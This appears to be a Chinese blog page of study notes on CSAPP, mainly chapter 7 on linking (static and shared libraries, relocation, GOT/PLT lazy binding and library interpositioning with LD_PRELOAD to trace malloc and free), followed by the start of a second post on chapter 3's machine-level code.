<p>静态库概念被提出来，相关的函数可以被编译为独立的目标模块，然后封装成一个单独的静态库文件。然后，应用程序可以通过命令行上指定单独的文件名字来使用这些在库中定义的函数</p>
<blockquote>
<p>比如，使用C标准库和数学库中函数的程序可以用形式如下的命令行来编译和链接</p>
<p><code>linux&gt; gcc main.c /usr/lib/libm.a /usr/lib/libc.a</code></p>
</blockquote>
<p>在链接时，链接器将只复制被程序引用的目标模块，这就减少了可执行文件在磁盘和内存中的大小。另一方面，应用程序员只需要包含较少的库文件的名字</p>
<p>在Linux系统中，静态库以一种称为<em>存档</em>的特殊文件格式存放在磁盘中，存档文件是一组连接起来的可重定位目标文件的集合，有一个头部用来描述每个成员目标文件的大小和位置。存档文件名由后缀<code>.a</code>标识</p>
<h3 id="7-6-3-链接器如何使用静态库来解析引用"><a href="#7-6-3-链接器如何使用静态库来解析引用" class="headerlink" title="7.6.3 链接器如何使用静态库来解析引用"></a>7.6.3 链接器如何使用静态库来解析引用</h3><p>Linux链接器使用解析外部引用的方式，在符号解析阶段，链接器从左到右按照它们在编译器驱动程序命令行上出现的顺序来扫描可重定位目标文件和存档文件（驱动程序自动将命令行中所有<code>.c</code>文件翻译为<code>.o</code>文件）在这次扫描中，链接器维护一个<strong>可重定位目标文件的集合E</strong>（这个集合中的文件会被合并起来形成可执行文件），<strong>一个未解析的符号</strong>（即引用了但是尚未定义的符号）集合U,以及<strong>一个在前面输入文件中已定义的符号集合D</strong>。初始时，E、U和D均为空</p>
<ul>
<li>对于命令行上的每个输入文件f，链接器会判断f是一个目标文件还是存档文件。</li>
<li>如果f是一个目标文件，那么链接器把f添加到E，修改U和D来反映f中的符号定义和引用，并继续下一个输入文件</li>
<li>如果f是一个存档文件，那么链接器就尝试匹配U中未解析的符号和由存档文件成员定义的符号。<ul>
<li>如果某个存档文件成员m,定义了一个符号来解析U中的一个引用，那么就将m添加到E中，并且链接器修改U和D来反映m中的符号定义和引用。</li>
<li>对存档文件中所有的成员目标文件都依次进行这个过程，直到U和D都不再发生变化。此时，任何不包含在E中的成员目标文件都简单地被丢弃，而链接器继续处理下一个输入文件</li>
<li>当链接器完成对命令行上输入文件的扫描后，U是非空的，那么链接器就会输出一个错误并终止。否则，它会合并和重定位E中的目标文件，构建输出的可执行文件</li>
</ul>
</li>
</ul>
<blockquote>
<p>所以会产生一些错误：如果定义一个符号的库出现在引用这个符号的目标文件之前，那么引用就不能被解析，链接就会失败</p>
</blockquote>
<h2 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h2><p>一旦链接器完成了符号解析这一步，就把代码中的每个符号引用和正好一个符号定义（即它的一个输入目标模块中国的一个符号表条目）关联起来。此时，链接器就知道它的输入目标模块中的代码节和数据节的确切大小。现在就可以开始<strong>重定位</strong>步骤了，在这个步骤中，将<strong>合并输入模块，并为每个符号分配运行时地址</strong></p>
<p>大致分为两步：</p>
<ul>
<li><p><strong>重定位节和符号定义</strong>：在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。</p>
<blockquote>
<p>例如：来自所有输入模块的<code>.data</code>节被全部合并成一个节，这个节成为输出的可执行目标文件的<code>.data</code>节。然后，链接器将运行时内存地址赋给新的聚合节，赋给输入定义模块定义的每个节，以及赋给输入模块定义的每个符号。当这一步完成时，程序中的每条指令和全局变量都有唯一的运行时内存地址了</p>
</blockquote>
</li>
<li><p><strong>重定位节中的符号引用</strong>：在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。要执行这一步，链接器依赖于可重定位目标模块中称为<em>重定位条目</em>的数据结构</p>
</li>
</ul>
<h3 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h3><p>当汇编器生成一个目标模块时,他并不知道数据和代码最终将存放在内存中的什么位置.它也不知道这个模块引用的任何外部定义的函数或者全局变量的位置.所以,无论何时汇编器遇到对最终位置未知的目标引用,它就会生成一个<code>重定位条目</code>,告诉链接器再将目标文件合并成可执行文件时如何修改这个引用.代码的重定位条目在<code>.rel.text</code>中.已初始化数据的重定位条目在<code>.rel.data</code>中</p>
<h3 id="7-7-2-重定位符号引用"><a href="#7-7-2-重定位符号引用" class="headerlink" title="7.7.2 重定位符号引用"></a>7.7.2 重定位符号引用</h3><h2 id="7-8-可执行目标文件"><a href="#7-8-可执行目标文件" class="headerlink" title="7.8 可执行目标文件"></a>7.8 可执行目标文件</h2><p>图 7-13 概括了一个典型的 ELF 可执行文件中的各类信息。</p>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20221007200534677.png" alt="image-20221007200534677"></th>
</tr>
</thead>
<tbody><tr>
<td>图 7-13 典型的 ELF 可执行目标文件</td>
</tr>
</tbody></table>
<p>可执行目标文件的格式类似于可重定位目标文件的格式.ELF头描述文件的总体格式.它还包括程旭的入口点,也就是当程序运行时要执行的第一条指令的地址.<code>.text</code>,<code>.rodata</code>和<code>.data</code>节与可重定位目标文件中的节是相似的,除了这些节已经被重定位到它们最终的运行时内存地址以外.</p>
<h2 id="7-9-加载可执行目标文件"><a href="#7-9-加载可执行目标文件" class="headerlink" title="7.9 加载可执行目标文件"></a>7.9 加载可执行目标文件</h2><p>要运行可执行目标文件<code>prog</code>,可以在Linux Shell的命令行中输入它的名字:<code>linux&gt; ./prog</code></p>
<p>因为<code>prog</code>不是一个内置的shell命令,所以shell会认为<code>prog</code>是一个可执行目标文件,通过调用某个驻留在存储器中称为加载器的操作系统代码来运行它.</p>
<p>每个Linux程序都有一个运行时的内存映像,如图7-15所示</p>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20221007201024855.png" alt="image-20221007201024855"></th>
</tr>
</thead>
<tbody><tr>
<td>图 7-15 Linux x86-64 运行时内存映像。没有展示出由于段对齐要求和地址空间布局随机化（ASLR）造成的空隙。区域大小不成比例</td>
</tr>
</tbody></table>
<p>在程序头部表的引导下,加载器将可执行文件的片(chunk)复制到代码段和数据段.接下里,加载器跳转到程序的入口点,也就是<code>_start</code>函数的地址,这个函数是在系统目标文件<code>ctrl.o</code>中定义的,对所有的C程序是一样的,<code>_start</code>函数调用系统启动参数<code>__libc_start_main</code>,该函数定义在<code>libc.so</code>中.它初始化执行环境,调用用户层的<code>main</code>函数,处理<code>mian</code>函数的返回值,并在需要的时候把控制返回给内核</p>
<h2 id="7-10-动态链接共享库"><a href="#7-10-动态链接共享库" class="headerlink" title="7.10 动态链接共享库"></a>7.10 动态链接共享库</h2><p>静态库仍然有一些明显的缺点。静态库和所有的软件一样，需要定期维护和更新，如果下你更要使用一个库的最新版本，必须以某种方式了解到该库的更新情况，然后显式地将程序与更新了的库重新链接。另一个问题是，几乎每个C程序都使用标准I&#x2F;O函数，比如<code>printf</code>和<code>scanf</code>在运行时，这些函数的代码会被复制到每个运行进程的文本段中，在一个运行上百个进程的典型系统上，这将是对稀缺的内存系统资源的极大浪费</p>
<p><strong>共享库</strong>是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序连接起来。这个过程称为<strong>动态链接</strong>，是由一个叫做<strong>动态链接器</strong>的程序来执行的。共享库也成为<strong>共享目标</strong>，在Linux系统中通常用<code>.so</code>后缀来表示，微软的操作系统大量地使用了共享库，它们称为DLL（动态链接库）</p>
<p>共享库是以两种不同的方式来“共享”的。首先，在任何给定的文件系统中，对于库只有一个<code>.so</code>文件。所有引用该库的可执行目标文件共享这个<code>.so</code>文件中的代码和数据，而不是像静态库的内部那样被复制和嵌入到引用他们的可执行文件中。其次，在内存中，一个共享库的<code>.text</code>节的一个副本可以被不同的正在运行的进程共享</p>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20221008200312620.png" alt="image-20221008200312620"></th>
</tr>
</thead>
<tbody><tr>
<td>图 7-16 动态链接共享库</td>
</tr>
</tbody></table>
<blockquote>
<p>图7-16概括了图7-7示例程序的动态链接过程。为了构造图7-6中示例向量例程的共享库<code>libvector.so</code>,我们调用编译器驱动程序，给编译器和链接器如下特殊指令</p>
<p><code>linux&gt; gcc -shared -fpic -o libvector.so addvec.c multvec.c</code></p>
<p><code>-fpic</code>选项指示编译器生成与位置无关的代码；<code>-shared</code>选项指示链接器创建一个共享的目标文件一旦创建了这个库，随后就要把它链接到图7-7的示例程序中</p>
<p><code>linux&gt; gcc -o prog21 main2.c ./libvector.so</code></p>
<p>这样就创建了一个可执行目标文件<code>prog21</code>，而此文件的形式使得它在运行时可以和<code>libvector.so</code>链接。基本的思路是当创建可执行文件时，静态执行一些链接，然后在程序加载时，动态完成链接过程</p>
<p>此时没有任何<code>libvector.so</code>的代码和数据节真的被复制到可执行文件<code>prog21</code>中。反之，链接器复制了一些重定位和符号表信息，它们使得运行可以解析对<code>libvector.so</code>中代码和数据的引用</p>
<p>当加载器加载和运行可执行文件<code>prog21</code>时，它利用7.9节中讨论过的技术，加载部分链接的可执行文件<code>prog21</code>。接着，它注意到<code>prog21</code>包含一个<code>.interp</code>节，这一节包含动态链接器的路径名，动态链接器本身就是一个共享目标。加载器不会像它通常所做的那样将控制传递给应用，而是加载和运行这个动态链接器。然后，动态链接器通过执行下面的重定位完成连接任务：</p>
<ul>
<li>重定位<code>libc.so</code>的文本和数据到某个内存段</li>
<li>重定位<code>libvector.so</code>的文本和数据到另一个内存段</li>
<li>重定位<code>prog21</code>中所有对由<code>libc.so</code>和<code>libvector.so</code>定义的符号的引用</li>
</ul>
<p>最后，动态链接器将控制传递给应用程序。从这个时候开始，共享库的位置就固定了，并且在程序执行的过程中都不会改变</p>
</blockquote>
<h2 id="7-11-从应用程序中加载和链接共享库"><a href="#7-11-从应用程序中加载和链接共享库" class="headerlink" title="7.11 从应用程序中加载和链接共享库"></a>7.11 从应用程序中加载和链接共享库</h2><p>应用程序还可能在它运行时要求动态链接器加载和链接某个共享库，而无需在编译时将那些库链接到应用中。</p>
<h2 id="7-12-位置无关代码"><a href="#7-12-位置无关代码" class="headerlink" title="7.12 位置无关代码"></a>7.12 位置无关代码</h2><p>共享库的一个主要目的就是允许多个正在运行的进程共享内存中相同的库代码，因而节约宝贵的内存资源。</p>
<p>为了避免占用过多内存资源，现代系统以这样一种方式编译共享模块的代码段，使得可以把它们加载到内存的任何位置而无需链接器修改。实用这种方法，无限多个进程可以共享一个共享模块的代码段的单一副本</p>
<p>可以加载而无需重定位的代码称为位置无关代码（Position-Independent Code，PIC），对 GCC 使用 <code>-fpic</code> 选项指示 GNU 编译系统生成 PIC 代码，<strong>共享库的编译必须总是使用该选项</strong>。</p>
<h3 id="1-PIC数据引用"><a href="#1-PIC数据引用" class="headerlink" title="1. PIC数据引用"></a>1. PIC数据引用</h3><p>编译器通过这样一个事实来生成对全局变量PIC的引用：无论我们在内存的何处加载一个目标模块（包括共享目标模块），数据段与代码段的距离总是保持不变。因此，代码段中任何指令和数据段中任何变量之间的<em>距离</em>都是一个运行时常量，域代码段和数据段的绝对内存位置是无关的</p>
<p>想要生成对全局变量PIC引用的编译器利用了这个事实，它在数据段开始的地方创建了一个表，叫做<em>全局偏移量表</em>（GOT），在GOT中，每个被这个目标模块引用的全局数据目标（过程或全局变量）都有一个8字节条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含目标的正确得绝对地址。每个引用全局得目标模块都有自己的GOT</p>
<p>图7-18展示了示例<code>libvector.so</code>共享模块的GOT。<code>addvec</code>例程通过GOT[3]间接地加载全局变量<code>addcnt</code>地地址，然后把<code>addcnt</code>在内存中加1。这里地关键思想史对GOT[3]的PC相对引用中的偏移量是一个运行时常量</p>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20250315233356912.png" alt="image-20250315233356912"></th>
</tr>
</thead>
<tbody><tr>
<td>图7-18 用GOT引用全局变量，<code>libvector.so</code>中的<code>addvec</code>例程通过<code>libvector.so</code>的GOT间接引用了<code>addcnt</code></td>
</tr>
</tbody></table>
<p>因为<code>addcnt</code>是由<code>libvector.so</code>模块定义的，编译器可以利用代码段和数据段之间不变的距离，产生对<code>addcnt</code>的直接PC相对引用，并增加一个重定位，让链接器在构造这个共享模块时解析它。不过，如果<code>addcnt</code>是由另一个共享模块定义的，那么就需要通过GOT进行间接访问。在这里，编译器采用最通用的解决方案，为所有的引用使用GOT</p>
<h3 id="2-PIC函数调用"><a href="#2-PIC函数调用" class="headerlink" title="2. PIC函数调用"></a>2. PIC函数调用</h3><p>假设程序调用一个由共享库定义的函数。编译器没有办法预测这个函数的运行时地址，因为定义它的共享模块在运行是可以加载到任意位置。正常的方法是为该引用生成一条重定位记录，然后动态链接器在程序加载的时候再解析它。不过，这种方法并不是PIC，因为它需要链接器修改调用模块的代码段，GNU编译系统使用了另一种技术来解决这个问题。称为<em><strong>延迟绑定技术</strong></em>，将过程地址的绑定推迟到了第一次调用该过程时</p>
<p>使用延迟绑定的动机是对于一个像<code>libc.so</code>这样的共享库输出的成百上千个函数中，一个典型的应用程序只会使用其中很少的一部分，把函数地址的解析推迟到它实际被调用的地方，能避免动态链接器在加载时进行成百上千个其实并不需要的重定位。第一次调用过程的运行时开销很大，但是其后的每次调用都只会花费一条指令和一个间接的内存引用</p>
<p>延迟绑定是通过两个数据结构之间简洁但又有些复杂的交互来实现的，这两个数据结构是：GOT和过程连接表（PLT)。如果一个目标模块调用定义在共享库中的任何函数，那么它就有自己的GOT和PLT表。GOT是数据段的一部分，而PLT是代码段的一部分</p>
<p>图7-19展示的是PLT和GOT如何协作在运行时解析函数的地址。首先检查一下这两个表的内容</p>
<ul>
<li><p>***过程链接表（PLT）<em><strong>PLT是一个</strong>数组</em>*，其中每个条目是16字节代码。PLT[0]是一个特殊条目，它跳转到动态链接器中。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目都负责调用一个具体的函数。<strong>PLT[1]调用系统启动函数（<code>__libc_start_main</code>)</strong>,它初始化执行环境,调用main函数并处理其返回值。从PLT[2]开始的条目调用用户代码调用的函数。在我们的例子中，PLT[2]调用<code>addvec</code>，PLT[3]调用<code>printf</code></p>
</li>
<li><p><em><strong>全局偏移量表（GOT）</strong></em>。GOT是一个<strong>数组</strong>，其中每个条目是8字节<strong>地址</strong>，和PLT联合使用时，GOT[0]和GOT[1]包含动态链接器在解析函数地址时会使用的信息。GOT[2]是动态链接器在<code>ld-linux.so</code>模块中的入口点。其余每个条目对应于一个被调用的函数，其地址需要在运行时被解析。每个条目都有一个相匹配的PLT条目。</p>
<blockquote>
<p>例如，GOT[4]和PLT[2]对应于<code>addvec</code>.初始时，每个GOT条目都指向对应PLT条目的第二条指令</p>
</blockquote>
</li>
</ul>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20250320221331544.png" alt="image-20250320221331544"></th>
</tr>
</thead>
<tbody><tr>
<td>图7-19 用PLT和GOT调用外部函数。在第一次调用<code>addvec</code>被第一次调用时，动态链接器解析它的地址</td>
</tr>
</tbody></table>
<p>图7-19a展示了GOT和PLT如何协同工作，在<code>addvec</code>被第一次调用时，延迟解析它的运行时地址</p>
<ul>
<li><em>第一步</em>。不直接调用<code>addvec</code>，程序调用进入PLT[2],这是<code>addvec</code>的PLT条目</li>
<li><em>第二步</em>。第一条PLT指令通过GOT[4]进行间接跳转。因为每个GOT条目初始时都指向它对应的PLT条目的第二条指令，这个间接跳转只是间接的把控制传送回PLT[2]中的下一条指令。</li>
<li><em>第三步</em>。在把<code>addvec</code>的ID<code>（0x1)</code>压入栈中之后，PLT[2]跳转到PLT[0]</li>
<li><em>第四步</em>。PLT[0]通过GOT[1]间接的把动态链接器的一个参数压入栈中，然后通过GOT[2]间接跳转进动态链接器中。动态链接器使用两个栈条目来确定<code>addvec</code>的运行时位置，用这个地址重写GOT[4],再把控制传递给<code>addvec</code></li>
</ul>
<p>图7-19b给出了后续再调用<code>addvec</code>时的控制流</p>
<ul>
<li><em>第一步</em>。和前面一样，控制传递到PLT[2]</li>
<li><em>第二步</em>。不过这次通过GOT[4]的间接跳转会将控制直接转移到<code>addvec</code></li>
</ul>
<h2 id="7-13-库打桩机制"><a href="#7-13-库打桩机制" class="headerlink" title="7.13 库打桩机制"></a>7.13 库打桩机制</h2><p>Linux 链接器支持库打桩<code>（library interpositioning）</code>，它允许你截获对共享库函数的调用，取而代之执行自己的代码。使用打桩机制，可以追踪对某个特殊库函数的调用次数，验证和追踪它的输入和输出值，<strong>甚至把它替换成一个完全不同的实现。</strong></p>
<p>下面是它的基本思想:给定一个需要打桩的<em>目标函数</em>，创建一个<em>包装函数</em>，它的原型与目标函数完全一样。使用某种特殊的打桩机制，你就可以欺骗系统调用包装函数而不是目标函数。包装函数通常会执行它自己的逻辑，然后调用目标函数，再将目标函数的返回值传递给调用者。</p>
<p>打桩可以发生在编译时、链接时或当程序被加载和执行的运行时。以图7-20a中的示例程序作为运行例子。它调用C标准库<code>（libc.so)</code>中的<code>malloc</code>和<code>free</code>的调用把块还回堆，供后续的<code>malloc</code>调用使用。我们的目标是用打桩来追踪程序运行时对<code>malloc</code>和<code>free</code>的调用</p>
<h3 id="7-13-1-编译时打桩"><a href="#7-13-1-编译时打桩" class="headerlink" title="7.13.1 编译时打桩"></a>7.13.1 编译时打桩</h3><p>图7-20展示了如何使用C预处理器在编译时打桩。<code>mymalloc.c</code>中的包装函数(图7-20c)调用目标函数，打印追踪记录，并返回。本地的<code>malloc.h</code>头文件（图7-20b)指示预处理器用对应相应包装函数的调用替换掉对目标函数的调用。像下面这样编译和链接这个程序;</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -DCOMPILETIME -c mymalloc.c</span></span><br><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -I. -o intc int.c mymalloc.o</span></span><br></pre></td></tr></table></figure>

<p>由于有<code>-I.</code>参数，所以会进行打桩，它告诉C预处理器在搜索通常的系统目录之前，先在当前目录中查找<code>malloc.h</code>。注意，<code>mymalloc.c</code>中的包装函数是使用标准<code>malloc.h</code>头文件编译的</p>
<p>运行这个程序会得到如下的追踪信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">eelinux&gt; </span><span class="language-bash">./intc</span></span><br><span class="line">malloc(32) = 0x9ee010</span><br><span class="line">free(0x9ee010)</span><br></pre></td></tr></table></figure>



<h3 id="7-13-2-链接时打桩"><a href="#7-13-2-链接时打桩" class="headerlink" title="7.13.2 链接时打桩"></a>7.13.2 链接时打桩</h3><p>Linux 静态链接器支持用 <code>--wrap f</code> 标志进行链接时打桩。这个标志告诉链接器，把对符号f的引用解析成<code>__wrap_f</code>(前缀是两个下划线)，还要把对符号<code>--real_f</code>（前缀是两个下划线）的引用解析为f。图7-21给出我们示例程序的包装函数</p>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20250320225930492.png" alt="image-20250320225930492"></th>
</tr>
</thead>
<tbody><tr>
<td>图7-20 用C预处理器进行编译时打桩</td>
</tr>
</tbody></table>
<p>用下述方法把这些源文件编译成可重定位目标文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -DLINKTIME -c mymalloc.c</span></span><br><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -c int.c</span></span><br></pre></td></tr></table></figure>

<p>然后把目标文件连接成可执行文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o</span></span><br></pre></td></tr></table></figure>

<p><code>-Wl,option</code>标志把<code>option</code>传递给链接器。<code>option</code>中的每个逗号都要替换为一个空格，所以<code>-Wl,--wrap,malloc</code>就把<code>--wrap malloc</code>传递给链接器，以类似的方式传递<code>--Wl,--wrap,free</code></p>
<table>
<thead>
<tr>
<th><img src="/./7_image/image-20250320230415795.png" alt="image-20250320230415795"></th>
</tr>
</thead>
<tbody><tr>
<td>图7-21 用<code>--wrap</code>标志进行链接时打桩</td>
</tr>
</tbody></table>
<p>运行该程序时会得到如下追踪信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">./intl</span></span><br><span class="line">malloc(32) = 0x18cf010</span><br><span class="line">free(0x18cf010)</span><br></pre></td></tr></table></figure>

<h3 id="7-13-3-运行时打桩"><a href="#7-13-3-运行时打桩" class="headerlink" title="7.13.3 运行时打桩"></a>7.13.3 运行时打桩</h3><p>编译时打桩需要能够访问程序的源代码，链接时打桩需要能够访问程序的可重定位对象文件。有一种机制能够在运行时打桩，它只需要能够访问可执行目标文件，这个很厉害的机制基于动态链接器的 <code>LD_PRELOAD</code> 环境变量。</p>
<p>如果<code>LD_PRELOAD</code>环境变量被设置为一个共享库路径名的列表（以空格或分号分隔），那么当你加载和执行一个程序，需要解析未定义的引用时，动态链接器(<code>LD-LINUX.SO</code>)会先搜索<code>LD_PRELOAD</code>库，然后才搜索任何其它的库。有了这个机制，当你加载和执行任意可执行文件时，可以对任何共享库中的任何函数打桩，包括<code>libc.so</code></p>
<p>图7-22展示了<code>malloc</code>和<code>free</code>的包装函数。每个包装函数中，对<code>dlsym</code>的调用返回指向目标<code>libc</code>函数的指针。然后包装哈桑农户调用目标函数，打印追踪记录，再返回</p>
<p>下面是如何构建包含这些包装函数的共享库的方法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl</span></span><br></pre></td></tr></table></figure>

<p>这是如何编译主程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -o intr int.c</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><img src="/./7_image/image-20250320231303286.png" alt="image-20250320231303286"></th>
</tr>
</thead>
<tbody><tr>
<td>图7-22 用<code>LD_PRELOAD</code>进行运行时打桩</td>
</tr>
</tbody></table>
<p>下面是如何从<code>bash shell</code>中运行这个程序;</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">LD_PRELOAD=<span class="string">&quot;./mymalloc.so&quot;</span> ./intr</span></span><br><span class="line">malloc(32) = 0x1bf7010</span><br><span class="line">free(0x1bf7010)</span><br></pre></td></tr></table></figure>

<p>请注意，你可以用<code>LD_PRELOAD</code>对任何可执行程序的库函数调用打桩</p>
<h2 id="7-14-处理目标文件的工具"><a href="#7-14-处理目标文件的工具" class="headerlink" title="7.14 处理目标文件的工具"></a>7.14 处理目标文件的工具</h2><p>略</p>
<h2 id="7-15-小结"><a href="#7-15-小结" class="headerlink" title="7.15 小结"></a>7.15 小结</h2><p>链接可以在编译时由静态编译器来完成，也可以在加载时和运行时由动态链接器来完成。链接器处理称为目标文件的二进制文件，它有 3 中不同的形式：可重定位的、可执行的和共享的。</p>
<p>链接器的两个主要任务是<strong>符号解析</strong>和<strong>重定位</strong>：符号解析将目标文件中的每个全局符号都绑定到一个唯一的定义；重定位确定每个符号的最终内存地址，并修改对那些目标的引用。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/csapp/3/3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/csapp/3/3/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-01-27 15:59:37" itemprop="dateModified" datetime="2025-01-27T15:59:37+08:00">2025-01-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="3-2-程序编码"><a href="#3-2-程序编码" class="headerlink" title="3.2 程序编码"></a>3.2 程序编码</h2><p><code>linux&gt; gcc -Og -o p p1.c p2.c</code></p>
<p><strong>编译选项<code>-Og</code></strong>:告诉编译器使用会生成符合原始C代码整体结构的机器代码的优化等级</p>
<p>实际上，gcc命令调用了一整套程序，将源代码转化为可执行代码，将源代码转化成可执行代码。首先，C预处理器扩展源代码，插入所有用<code>#include</code>命令指定的文件，并扩展所有用<code>#define</code>声明指定的宏。</p>
<p>其次，编译器产生两个源文件的汇编代码，名字分别为<code>p1.s</code>和<code>p2.s</code>。</p>
<p>接下来，汇编器会将汇编代码转化成二进制目标代码文件<code>p1.o</code>和<code>p2.o</code>。目标代码是机器代码的一种形式，它包含所有指令的二进制表示，但是还没有填入全局值的地址</p>
<p>最后，连接器将两个目标代码文件与实现库函数（如printf）的代码合并，并产生最终的可执行代码文件p（由命令行指示符<code>-o p</code>指定的）</p>
<h3 id="3-2-1-机器级代码"><a href="#3-2-1-机器级代码" class="headerlink" title="3.2.1 机器级代码"></a>3.2.1 机器级代码</h3><p><strong>指令集体系架构</strong>或<strong>指令集架构（ISA）</strong>：定义机器级程序的格式和行为，它定义了处理器状态、指令的格式，以及每条指令对状态的影响。处理器的硬件并发的执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行的行为完全一致</p>
<p>机器级程序使用的内存地址是虚拟地址，提供的内存模型看上去是一个非常大的字节数组。存储器系统的实际实现是将多个硬件存储器的操作系统软件组合起来。</p>
<ul>
<li><strong>程序计数器</strong>（通常称为PC，在x86-64中用%rip表示）：给出将要执行的下一条指令在内存中的地址</li>
<li>整数<strong>寄存器</strong>文件包含16个命名的位置，分别存储64位的值。这些寄存器可以存储地址（对应C语言的指针）或整数结构。有的寄存器被用来记录某些重要的程序状态，而其它的寄存器用来保存临时数据，例如过程的参数和局部变量，以及函数的返回值。</li>
<li>条件吗寄存器保存着最近执行的算数或逻辑指令的状态信息。他们用来实现控制或数据流中的条件变化，比如说用来实现if和while语句</li>
<li>一组向量寄存器可以存放一个或多个整数或浮点数值</li>
</ul>
<p>机器代码只是简单的将内存看成一个很大的、按字节寻址的数组</p>
<p>较典型的程序只会访问几兆字节或几千兆字节的数据。操作系统负责管理虚拟地址空间，将虚拟地址翻译成实际处理器内存中的物理地址</p>
<h3 id="3-2-2-代码示例"><a href="#3-2-2-代码示例" class="headerlink" title="3.2.2 代码示例"></a>3.2.2 代码示例</h3><p>假设存在c语言代码文件<code>mstore.c</code>，包含如下的函数定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">mult2</span><span class="params">(<span class="type">long</span>,<span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">multstore</span><span class="params">(<span class="type">long</span> x,<span class="type">long</span> y,<span class="type">long</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> t = mult2(x,y);</span><br><span class="line">    *dest = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在命令行上使用<code>- S</code>选项，就能看到c语言编译器产生的汇编代码</p>
<p><code>linux&gt; gcc -Og -S mstore.c</code></p>
<p>这会使GCC运行编译器，产生一个汇编文件<code>mstore.s</code>，但是不做其它进一步工作（通常情况下，它还会继续调用汇编器产生目标代码文件）</p>
